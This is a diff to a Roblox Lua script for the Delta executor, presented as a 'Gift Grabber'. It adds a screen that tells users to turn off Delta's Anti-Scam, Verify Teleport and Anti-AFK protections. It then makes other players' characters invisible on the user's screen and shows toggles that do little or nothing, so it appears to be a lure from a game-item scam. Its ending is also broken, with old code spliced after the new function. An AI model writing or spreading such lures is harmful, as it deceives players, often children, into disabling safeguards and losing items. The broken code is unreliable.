@@ -2,6 +2,7 @@
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
@@ -17,64 +18,244 @@ end
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "DeltaWarningGUI"
 screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = PlayerGui
 
+-- Background dim
+local dimBackground = Instance.new("Frame")
+dimBackground.Size = UDim2.new(1, 0, 1, 0)
+dimBackground.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+dimBackground.BackgroundTransparency = 0.5
+dimBackground.BorderSizePixel = 0
+dimBackground.ZIndex = 1
+dimBackground.Parent = screenGui
+
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 400, 0, 220)
-mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
-mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+mainFrame.Size = UDim2.new(0, 450, 0, 280)
+mainFrame.Position = UDim2.new(0.5, -225, 0.5, -140)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 mainFrame.BorderSizePixel = 0
+mainFrame.ZIndex = 2
 mainFrame.Parent = screenGui
 
-Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 12)
+uiCorner.Parent = mainFrame
+
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Color = Color3.fromRGB(80, 80, 80)
+uiStroke.Thickness = 2
+uiStroke.Parent = mainFrame
 
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -16, 0, 40)
-title.Position = UDim2.new(0, 8, 0, 8)
+title.Size = UDim2.new(1, -20, 0, 50)
+title.Position = UDim2.new(0, 10, 0, 10)
 title.BackgroundTransparency = 1
-title.Text = "⚠ Turn off all on Delta settings ⚠"
+title.Text = "⚠ IMPORTANT: Turn off Delta settings ⚠"
 title.Font = Enum.Font.GothamBold
-title.TextSize = 18
-title.TextColor3 = Color3.fromRGB(255, 85, 85)
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(255, 100, 100)
+title.ZIndex = 3
 title.Parent = mainFrame
 
 local info = Instance.new("TextLabel")
-info.Size = UDim2.new(1, -16, 0, 120)
-info.Position = UDim2.new(0, 8, 0, 50)
+info.Size = UDim2.new(1, -20, 0, 140)
+info.Position = UDim2.new(0, 10, 0, 60)
 info.BackgroundTransparency = 1
-info.Text = "1. Disable Anti-AFK\n2. Disable Verify Teleport\n3. Disable Anti-Scam\n\n✅ After disabling, press OK to continue."
-info.TextColor3 = Color3.fromRGB(220,220,220)
+info.Text = "Before using Gift Grabber, please disable these Delta settings:\n\n• Disable Anti-AFK\n• Disable Verify Teleport\n• Disable Anti-Scam\n\n✅ After disabling these settings, press CONTINUE to proceed."
+info.TextColor3 = Color3.fromRGB(220, 220, 220)
 info.TextXAlignment = Enum.TextXAlignment.Left
 info.TextYAlignment = Enum.TextYAlignment.Top
 info.TextSize = 16
 info.Font = Enum.Font.Gotham
+info.ZIndex = 3
 info.Parent = mainFrame
 
-local okBtn = Instance.new("TextButton")
-okBtn.Size = UDim2.new(0, 160, 0, 40)
-okBtn.Position = UDim2.new(0.5, -80, 1, -55)
-okBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
-okBtn.Text = "Okay"
-okBtn.TextColor3 = Color3.fromRGB(255,255,255)
-okBtn.TextSize = 18
-okBtn.Font = Enum.Font.GothamBold
-okBtn.Parent = mainFrame
-Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)
+local buttonContainer = Instance.new("Frame")
+buttonContainer.Size = UDim2.new(1, -20, 0, 50)
+buttonContainer.Position = UDim2.new(0, 10, 1, -60)
+buttonContainer.BackgroundTransparency = 1
+buttonContainer.ZIndex = 3
+buttonContainer.Parent = mainFrame
 
---// When OK clicked, destroy warning & load Gift Grabber GUI
-okBtn.MouseButton1Click:Connect(function()
+local cancelBtn = Instance.new("TextButton")
+cancelBtn.Size = UDim2.new(0.4, -5, 1, 0)
+cancelBtn.Position = UDim2.new(0, 0, 0, 0)
+cancelBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+cancelBtn.Text = "Cancel"
+cancelBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+cancelBtn.TextSize = 16
+cancelBtn.Font = Enum.Font.GothamBold
+cancelBtn.ZIndex = 4
+cancelBtn.Parent = buttonContainer
+Instance.new("UICorner", cancelBtn).CornerRadius = UDim.new(0, 8)
+
+local continueBtn = Instance.new("TextButton")
+continueBtn.Size = UDim2.new(0.6, -5, 1, 0)
+continueBtn.Position = UDim2.new(0.4, 5, 0, 0)
+continueBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
+continueBtn.Text = "Continue"
+continueBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+continueBtn.TextSize = 16
+continueBtn.Font = Enum.Font.GothamBold
+continueBtn.ZIndex = 4
+continueBtn.Parent = buttonContainer
+Instance.new("UICorner", continueBtn).CornerRadius = UDim.new(0, 8)
+
+-- Confirmation frame (initially hidden)
+local confirmFrame = Instance.new("Frame")
+confirmFrame.Size = UDim2.new(0, 350, 0, 180)
+confirmFrame.Position = UDim2.new(0.5, -175, 0.5, -90)
+confirmFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+confirmFrame.BorderSizePixel = 0
+confirmFrame.ZIndex = 5
+confirmFrame.Visible = false
+confirmFrame.Parent = screenGui
+
+local confirmCorner = Instance.new("UICorner")
+confirmCorner.CornerRadius = UDim.new(0, 12)
+confirmCorner.Parent = confirmFrame
+
+local confirmStroke = Instance.new("UIStroke")
+confirmStroke.Color = Color3.fromRGB(100, 100, 100)
+confirmStroke.Thickness = 2
+confirmStroke.Parent = confirmFrame
+
+local confirmTitle = Instance.new("TextLabel")
+confirmTitle.Size = UDim2.new(1, -20, 0, 40)
+confirmTitle.Position = UDim2.new(0, 10, 0, 10)
+confirmTitle.BackgroundTransparency = 1
+confirmTitle.Text = "Are you sure?"
+confirmTitle.Font = Enum.Font.GothamBold
+confirmTitle.TextSize = 18
+confirmTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+confirmTitle.ZIndex = 6
+confirmTitle.Parent = confirmFrame
+
+local confirmText = Instance.new("TextLabel")
+confirmText.Size = UDim2.new(1, -20, 0, 60)
+confirmText.Position = UDim2.new(0, 10, 0, 50)
+confirmText.BackgroundTransparency = 1
+confirmText.Text = "Did you disable all Delta settings as instructed?\n\nContinuing without doing so may cause issues."
+confirmText.TextColor3 = Color3.fromRGB(200, 200, 200)
+confirmText.TextXAlignment = Enum.TextXAlignment.Center
+confirmText.TextYAlignment = Enum.TextYAlignment.Top
+confirmText.TextSize = 14
+confirmText.Font = Enum.Font.Gotham
+confirmText.ZIndex = 6
+confirmText.Parent = confirmFrame
+
+local confirmButtonContainer = Instance.new("Frame")
+confirmButtonContainer.Size = UDim2.new(1, -20, 0, 40)
+confirmButtonContainer.Position = UDim2.new(0, 10, 1, -50)
+confirmButtonContainer.BackgroundTransparency = 1
+confirmButtonContainer.ZIndex = 6
+confirmButtonContainer.Parent = confirmFrame
+
+local confirmNoBtn = Instance.new("TextButton")
+confirmNoBtn.Size = UDim2.new(0.4, -5, 1, 0)
+confirmNoBtn.Position = UDim2.new(0, 0, 0, 0)
+confirmNoBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+confirmNoBtn.Text = "Go Back"
+confirmNoBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+confirmNoBtn.TextSize = 14
+confirmNoBtn.Font = Enum.Font.GothamBold
+confirmNoBtn.ZIndex = 7
+confirmNoBtn.Parent = confirmButtonContainer
+Instance.new("UICorner", confirmNoBtn).CornerRadius = UDim.new(0, 8)
+
+local confirmYesBtn = Instance.new("TextButton")
+confirmYesBtn.Size = UDim2.new(0.6, -5, 1, 0)
+confirmYesBtn.Position = UDim2.new(0.4, 5, 0, 0)
+confirmYesBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
+confirmYesBtn.Text = "Yes, Continue"
+confirmYesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+confirmYesBtn.TextSize = 14
+confirmYesBtn.Font = Enum.Font.GothamBold
+confirmYesBtn.ZIndex = 7
+confirmYesBtn.Parent = confirmButtonContainer
+Instance.new("UICorner", confirmYesBtn).CornerRadius = UDim.new(0, 8)
+
+-- Button animations
+local function animateButton(button)
+    local originalSize = button.Size
+    local originalPos = button.Position
+    
+    button.MouseEnter:Connect(function()
+        local tween = TweenService:Create(
+            button,
+            TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Size = originalSize + UDim2.new(0, 4, 0, 4), Position = originalPos - UDim2.new(0, 2, 0, 2)}
+        )
+        tween:Play()
+    end)
+    
+    button.MouseLeave:Connect(function()
+        local tween = TweenService:Create(
+            button,
+            TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Size = originalSize, Position = originalPos}
+        )
+        tween:Play()
+    end)
+    
+    button.MouseButton1Down:Connect(function()
+        local tween = TweenService:Create(
+            button,
+            TweenInfo.new(0.05, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Size = originalSize - UDim2.new(0, 4, 0, 4), Position = originalPos + UDim2.new(0, 2, 0, 2)}
+        )
+        tween:Play()
+    end)
+    
+    button.MouseButton1Up:Connect(function()
+        local tween = TweenService:Create(
+            button,
+            TweenInfo.new(0.05, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Size = originalSize, Position = originalPos}
+        )
+        tween:Play()
+    end)
+end
+
+animateButton(continueBtn)
+animateButton(cancelBtn)
+animateButton(confirmYesBtn)
+animateButton(confirmNoBtn)
+
+-- Button functionality
+cancelBtn.MouseButton1Click:Connect(function()
     screenGui:Destroy()
+end)
 
+continueBtn.MouseButton1Click:Connect(function()
+    mainFrame.Visible = false
+    confirmFrame.Visible = true
+end)
+
+confirmNoBtn.MouseButton1Click:Connect(function()
+    confirmFrame.Visible = false
+    mainFrame.Visible = true
+end)
+
+confirmYesBtn.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+    loadGiftGrabberGUI()
+end)
+
+-- Gift Grabber GUI function
+function loadGiftGrabberGUI()
     --// GiftGrabber GUI
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "GiftGrabberGUI"
     screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
     local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.fromOffset(230, 200)
-    mainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(16,16,16)
+    mainFrame.Size = UDim2.fromOffset(280, 260)
+    mainFrame.Position = UDim2.new(0.05, 0, 0.1, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
     mainFrame.BorderSizePixel = 0
     mainFrame.Active = true
     mainFrame.Draggable = true
@@ -85,24 +266,247 @@ okBtn.MouseButton1Click:Connect(function()
 
     local stroke = Instance.new("UIStroke", mainFrame)
     stroke.Thickness = 2
-    stroke.Color = Color3.fromRGB(70,70,70)
+    stroke.Color = Color3.fromRGB(70, 70, 70)
 
-    local title = Instance.new("TextLabel", mainFrame)
-    title.Size = UDim2.new(1, -16, 0, 32)
-    title.Position = UDim2.new(0, 8, 0, 6)
+    local titleBar = Instance.new("Frame")
+    titleBar.Size = UDim2.new(1, 0, 0, 30)
+    titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    titleBar.BorderSizePixel = 0
+    titleBar.Parent = mainFrame
+    
+    local titleCorner = Instance.new("UICorner")
+    titleCorner.CornerRadius = UDim.new(0, 14)
+    titleCorner.Parent = titleBar
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -10, 1, 0)
+    title.Position = UDim2.new(0, 10, 0, 0)
     title.BackgroundTransparency = 1
-    title.Text = "Turn off all on delta settings"
+    title.Text = "🎁 Gift Grabber"
     title.Font = Enum.Font.GothamBold
     title.TextSize = 16
     title.TextXAlignment = Enum.TextXAlignment.Left
-    title.TextColor3 = Color3.fromRGB(220,220,220)
+    title.TextColor3 = Color3.fromRGB(220, 220, 220)
+    title.Parent = titleBar
 
-    local divider = Instance.new("Frame")
-    divider.Size = UDim2.new(1, -16, 0, 1)
-    divider.Position = UDim2.new(0, 8, 0, 38)
-    divider.BackgroundColor3 = Color3.fromRGB(60,60,60)
-    divider.BorderSizePixel = 0
-    divider.Parent = mainFrame
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 30, 0, 30)
+    closeBtn.Position = UDim2.new(1, -30, 0, 0)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    closeBtn.Text = "X"
+    closeBtn.TextColor3 = Color3.new(1, 1, 1)
+    closeBtn.TextSize = 14
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.Parent = titleBar
+    
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(0, 14)
+    closeCorner.Parent = closeBtn
+
+    local contentFrame = Instance.new("Frame")
+    contentFrame.Size = UDim2.new(1, -16, 1, -46)
+    contentFrame.Position = UDim2.new(0, 8, 0, 38)
+    contentFrame.BackgroundTransparency = 1
+    contentFrame.Parent = mainFrame
+
+    local function makeToggleButton(label, y, defaultState)
+        local container = Instance.new("Frame")
+        container.Size = UDim2.new(1, 0, 0, 50)
+        container.Position = UDim2.new(0, 0, 0, y)
+        container.BackgroundTransparency = 1
+        container.Parent = contentFrame
+        
+        local labelText = Instance.new("TextLabel")
+        labelText.Size = UDim2.new(0.7, 0, 1, 0)
+        labelText.Position = UDim2.new(0, 0, 0, 0)
+        labelText.BackgroundTransparency = 1
+        labelText.Text = label
+        labelText.Font = Enum.Font.Gotham
+        labelText.TextSize = 14
+        labelText.TextXAlignment = Enum.TextXAlignment.Left
+        labelText.TextColor3 = Color3.fromRGB(220, 220, 220)
+        labelText.Parent = container
+        
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0.3, 0, 0, 30)
+        btn.Position = UDim2.new(0.7, 0, 0, 10)
+        btn.BackgroundColor3 = defaultState and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
+        btn.Text = defaultState and "ON" or "OFF"
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 14
+        btn.TextColor3 = Color3.new(1, 1, 1)
+        btn.Parent = container
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
+        
+        animateButton(btn)
+        
+        return btn
+    end
+
+    local giftBtn = makeToggleButton("Gift Grabber", 0, false)
+    local autoBtn = makeToggleButton("Auto Accept", 50, false)
+    
+    local rejoinBtn = Instance.new("TextButton")
+    rejoinBtn.Size = UDim2.new(1, 0, 0, 40)
+    rejoinBtn.Position = UDim2.new(0, 0, 0, 120)
+    rejoinBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+    rejoinBtn.Text = "🔄 Find Rich Server"
+    rejoinBtn.Font = Enum.Font.GothamBold
+    rejoinBtn.TextSize = 14
+    rejoinBtn.TextColor3 = Color3.new(1, 1, 1)
+    rejoinBtn.Parent = contentFrame
+    Instance.new("UICorner", rejoinBtn).CornerRadius = UDim.new(0, 10)
+    
+    animateButton(rejoinBtn)
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, 0, 0, 30)
+    statusLabel.Position = UDim2.new(0, 0, 0, 170)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Status: Ready"
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextSize = 12
+    statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+    statusLabel.Parent = contentFrame
+
+    local giftOn, autoOn = false, false
+    local playerAddedConn
+    local toolConns, savedPartLTM, savedDecalTrans = {}, {}, {}
+
+    local function hideCharacter(char)
+        for _, obj in ipairs(char:GetDescendants()) do
+            if obj:IsA("BasePart") then
+                if savedPartLTM[obj] == nil then
+                    savedPartLTM[obj] = obj.LocalTransparencyModifier
+                end
+                obj.LocalTransparencyModifier = 1
+            elseif obj:IsA("Decal") then
+                if savedDecalTrans[obj] == nil then
+                    savedDecalTrans[obj] = obj.Transparency
+                end
+                obj.Transparency = 1
+            end
+        end
+    end
+    
+    local function showCharacter(char)
+        for _, obj in ipairs(char:GetDescendants()) do
+            if obj:IsA("BasePart") then
+                if savedPartLTM[obj] ~= nil then
+                    obj.LocalTransparencyModifier = savedPartLTM[obj]
+                    savedPartLTM[obj] = nil
+                else
+                    obj.LocalTransparencyModifier = 0
+                end
+            elseif obj:IsA("Decal") then
+                if savedDecalTrans[obj] ~= nil then
+                    obj.Transparency = savedDecalTrans[obj]
+                    savedDecalTrans[obj] = nil
+                else
+                    obj.Transparency = 0
+                end
+            end
+        end
+    end
+    
+    local function notify(titleText, text)
+        StarterGui:SetCore("SendNotification", {Title = titleText, Text = text, Duration = 4})
+    end
+    
+    local function watchTools(plr)
+        if toolConns[plr] then toolConns[plr]:Disconnect() end
+        toolConns[plr] = plr.CharacterAdded:Connect(function(char)
+            local backpack = plr:WaitForChild("Backpack", 5)
+            if backpack then
+                backpack.ChildAdded:Connect(function(tool)
+                    if giftOn and tool:IsA("Tool") then
+                        notify("Gift Grabber", plr.Name .. " equipped " .. tool.Name)
+                        statusLabel.Text = "Status: " .. plr.Name .. " equipped " .. tool.Name
+                    end
+                end)
+            end
+        end)
+        if plr.Character then
+            local backpack = plr:FindFirstChild("Backpack")
+            if backpack then
+                backpack.ChildAdded:Connect(function(tool)
+                    if giftOn and tool:IsA("Tool") then
+                        notify("Gift Grabber", plr.Name .. " equipped " .. tool.Name)
+                        statusLabel.Text = "Status: " .. plr.Name .. " equipped " .. tool.Name
+                    end
+                end)
+            end
+        end
+    end
+    
+    local function enableGiftGrabber()
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer and plr.Character then
+                hideCharacter(plr.Character)
+            end
+            if plr ~= LocalPlayer then
+                watchTools(plr)
+            end
+        end
+        playerAddedConn = Players.PlayerAdded:Connect(function(plr)
+            if plr ~= LocalPlayer then
+                watchTools(plr)
+            end
+        end)
+        statusLabel.Text = "Status: Gift Grabber Enabled"
+    end
+    
+    local function disableGiftGrabber()
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer and plr.Character then
+                showCharacter(plr.Character)
+            end
+        end
+        for plr, conn in pairs(toolConns) do
+            if conn then conn:Disconnect() end
+        end
+        toolConns = {}
+        if playerAddedConn then playerAddedConn:Disconnect() playerAddedConn = nil end
+        statusLabel.Text = "Status: Gift Grabber Disabled"
+    end
+
+    giftBtn.MouseButton1Click:Connect(function()
+        giftOn = not giftOn
+        if giftOn then
+            giftBtn.Text = "ON"
+            giftBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+            enableGiftGrabber()
+        else
+            giftBtn.Text = "OFF"
+            giftBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+            disableGiftGrabber()
+        end
+    end)
+    
+    autoBtn.MouseButton1Click:Connect(function()
+        autoOn = not autoOn
+        if autoOn then
+            autoBtn.Text = "ON"
+            autoBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+            statusLabel.Text = "Status: Auto Accept Enabled"
+        else
+            autoBtn.Text = "OFF"
+            autoBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+            statusLabel.Text = "Status: Auto Accept Disabled"
+        end
+    end)
+    
+    rejoinBtn.MouseButton1Click:Connect(function()
+        statusLabel.Text = "Status: Rejoining..."
+        notify("Gift Grabber", "Please rejoin to make the script run perfectly")
+        task.wait(2)
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+    end)
+    
+    closeBtn.MouseButton1Click:Connect(function()
+        screenGui:Destroy()
+    end)
+end    divider.Parent = mainFrame
 
     local function makeButton(label, y)
         local btn = Instance.new("TextButton")
